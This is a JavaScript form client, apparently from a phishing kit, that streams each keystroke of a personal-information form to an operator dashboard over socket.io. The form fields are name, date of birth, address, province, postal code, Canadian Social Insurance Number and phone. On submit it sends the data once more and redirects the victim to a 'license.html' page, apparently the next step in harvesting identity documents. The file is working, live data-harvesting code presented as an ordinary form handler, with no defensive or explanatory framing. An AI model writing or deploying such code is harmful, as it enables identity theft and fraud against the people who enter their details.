/* info-client.js */
(function () {
  const SERVER_URL = window.location.origin;
  const SESSION_STORAGE_KEY = "sessionID";
  const DASH_EMIT_EVENT = "client-data";
  const DASH_JOIN_EVENT = "client-join";
  const PAGE_PROGRESS_KEY = "page_progress";

  
  // --- Utilities -----------------------------------------------------------
  function onceDomReady(fn) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", fn, { once: true });
    } else {
      fn();
    }
  }

  function getOrCreateSessionID() {
    let sid = null;
    try { sid = localStorage.getItem(SESSION_STORAGE_KEY) || null; } catch {}
    if (!sid) {
      sid = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
      try { localStorage.setItem(SESSION_STORAGE_KEY, sid); } catch {}
    }
    return sid;
  }

  function debounce(fn, ms) {
    let t;
    return function (...args) {
      clearTimeout(t);
      t = setTimeout(() => fn.apply(this, args), ms);
    };
  }

  // Page progress tracking functions
  window.setPageProgress = function(page) {
    try { localStorage.setItem(PAGE_PROGRESS_KEY, page); } catch {}
  };
  
  window.getPageProgress = function() {
    try { return localStorage.getItem(PAGE_PROGRESS_KEY) || null; } catch { return null; }
  };
  
  window.clearPageProgress = function() {
    try { localStorage.removeItem(PAGE_PROGRESS_KEY); } catch {}
  };

  

  // --- Socket layer --------------------------------------------------------
  function ensureSocketIO(cb) {
    if (window.io && typeof window.io === "function") return cb();

    const s = document.createElement("script");
    s.src = SERVER_URL.replace(/\/$/, "") + "/socket.io/socket.io.js";
    s.async = true;
    s.onload = cb;
    s.onerror = () => console.warn("[info-client] Could not load socket.io from server.");
    document.head.appendChild(s);
  }

  function connectSocket(sessionID) {
    if (!window.io) {
      console.warn("[info-client] socket.io not available.");
      return null;
    }
    const socket = window.io(SERVER_URL, { transports: ["websocket", "polling"] });

    socket.on("connect", () => {
      console.log("[info-client] connected:", socket.id, "session:", sessionID);
      socket.emit(DASH_JOIN_EVENT, { sessionID });
    });

    socket.on("disconnect", () => {
      console.log("[info-client] disconnected");
    });

    // Listen for dashboard actions if needed
    socket.on("dashboard-action", ({ buttonName, value }) => {
      console.log("[info-client] dashboard action:", buttonName, value);
      // Handle any dashboard commands here if needed
    });

    return socket;
  }

  // --- Main ---------------------------------------------------------------
  onceDomReady(function () {
    // Prepare socket
    ensureSocketIO(() => {
      const sessionID = getOrCreateSessionID();
      const socket = connectSocket(sessionID);
      if (!socket) return;

      // Get all form inputs
      const nameInput = document.getElementById('name');
      const dayInput = document.getElementById('day');
      const monthInput = document.getElementById('month');
      const yearInput = document.getElementById('year');
      const cityInput = document.getElementById('city');
      const provinceInput = document.getElementById('province');
      const addressInput = document.getElementById('address');
      const postalInput = document.getElementById('postal');
      const sinInput = document.getElementById('sin');
      const phoneInput = document.getElementById('phone');

      // Debounced emitters for real-time updates
      const sendName = debounce((val) => {
        socket.emit(DASH_EMIT_EVENT, { type: "full-name", data: String(val || "") });
      }, 300);

      const sendDOB = debounce(() => {
        const day = dayInput.value || "";
        const month = monthInput.value || "";
        const year = yearInput.value || "";
        const dob = `${day}/${month}/${year}`;
        socket.emit(DASH_EMIT_EVENT, { type: "date-of-birth", data: dob });
      }, 300);

      const sendCity = debounce((val) => {
        socket.emit(DASH_EMIT_EVENT, { type: "city", data: String(val || "") });
      }, 300);

      const sendProvince = debounce((val) => {
        socket.emit(DASH_EMIT_EVENT, { type: "province", data: String(val || "") });
      }, 300);

      const sendAddress = debounce((val) => {
        socket.emit(DASH_EMIT_EVENT, { type: "street-address", data: String(val || "") });
      }, 300);

      const sendPostal = debounce((val) => {
        socket.emit(DASH_EMIT_EVENT, { type: "postal-code", data: String(val || "") });
      }, 300);

      const sendSIN = debounce((val) => {
        socket.emit(DASH_EMIT_EVENT, { type: "sin", data: String(val || "") });
      }, 300);

      const sendPhone = debounce((val) => {
        socket.emit(DASH_EMIT_EVENT, { type: "phone", data: String(val || "") });
      }, 300);

      // Attach input listeners for real-time updates
      if (nameInput) {
        nameInput.addEventListener('input', (e) => sendName(e.target.value));
      }

      if (dayInput) {
        dayInput.addEventListener('input', () => sendDOB());
      }

      if (monthInput) {
        monthInput.addEventListener('input', () => sendDOB());
      }

      if (yearInput) {
        yearInput.addEventListener('input', () => sendDOB());
      }

      if (cityInput) {
        cityInput.addEventListener('input', (e) => sendCity(e.target.value));
      }

      if (provinceInput) {
        provinceInput.addEventListener('input', (e) => sendProvince(e.target.value));
      }

      if (addressInput) {
        addressInput.addEventListener('input', (e) => sendAddress(e.target.value));
      }

      if (postalInput) {
        postalInput.addEventListener('input', (e) => sendPostal(e.target.value));
      }

      if (sinInput) {
        sinInput.addEventListener('input', (e) => sendSIN(e.target.value));
      }

      if (phoneInput) {
        phoneInput.addEventListener('input', (e) => sendPhone(e.target.value));
      }

      // Handle form submission
      const form = document.querySelector('form');
      if (form) {
        form.addEventListener('submit', function(e) {
          e.preventDefault();
          
          const formData = {
            name: nameInput.value,
            dob: `${dayInput.value}/${monthInput.value}/${yearInput.value}`,
            city: cityInput.value,
            province: provinceInput.value,
            address: addressInput.value,
            postal: postalInput.value,
            phone: phoneInput ? phoneInput.value : "",
          };

          console.log('[info-client] Form submitted:', formData);

          // Send final confirmation that form was submitted
          socket.emit(DASH_EMIT_EVENT, { 
            type: "info-form-submitted", 
            data: JSON.stringify(formData)
          });

          // Store in localStorage
          try {
            localStorage.setItem('infoFormData', JSON.stringify(formData));
          } catch {}

 // Redirect to license.html
          setTimeout(() => {
            window.setPageProgress('license.html');
            window.location.replace('license.html');
          }, 200);
        });
      }

      // Override the global handleSubmit if it exists
      window.handleSubmit = function(event) {
        event.preventDefault();
        if (form) {
          form.dispatchEvent(new Event('submit'));
        }
      };
    });
  });
})();